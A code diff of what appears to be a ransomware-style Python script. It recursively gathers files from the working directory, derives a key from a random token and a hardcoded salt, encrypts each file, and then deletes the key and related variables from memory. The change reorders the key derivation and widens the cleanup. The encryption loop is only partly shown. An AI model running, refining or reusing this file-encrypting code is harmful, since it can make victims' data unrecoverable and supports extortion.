@@ -30,13 +30,6 @@ if False:
         print(error)
 
 # ========================================================================= #
-# Node Setup:
-# ========================================================================= #
-node_sig = secrets.token_urlsafe(16)
-node_key = hashlib.blake2s(str(node_sig + "qv1m3r4").encode()).hexdigest()[24:48][::-1]
-node_key_hash = hashlib.blake2s(node_key.encode()).hexdigest()
-
-# ========================================================================= #
 # General Setup:
 # ========================================================================= #
 class Tool:
@@ -68,6 +61,11 @@ for dirpath, dirs, files in os.walk(os.getcwd()):
             tool.files_found.append(path)
 
 # ========================================================================= #
+# Node Setup:
+# ========================================================================= #
+node_sig = secrets.token_urlsafe(16)
+
+# ========================================================================= #
 # Save Progress:
 # ========================================================================= #
 with open("egg_{0}.txt".format(node_sig), "w") as fl:
@@ -81,6 +79,8 @@ with open("egg_{0}.txt".format(node_sig), "w") as fl:
 # ========================================================================= #
 # Encrypt:
 # ========================================================================= #
+node_key = hashlib.blake2s(str(node_sig + "qv1m3r4").encode()).hexdigest()[24:48][::-1]
+
 for f in tool.files_found:
     try:
         # Ignore this file and progress log:
@@ -97,7 +97,7 @@ for f in tool.files_found:
     except Exception as error:
         print(error)
 # All files encrypted? Delete key from memory:
-del node_key
+del node_key, node_sig, tool, tmp_key
 gc.collect()
 
 # ========================================================================= #
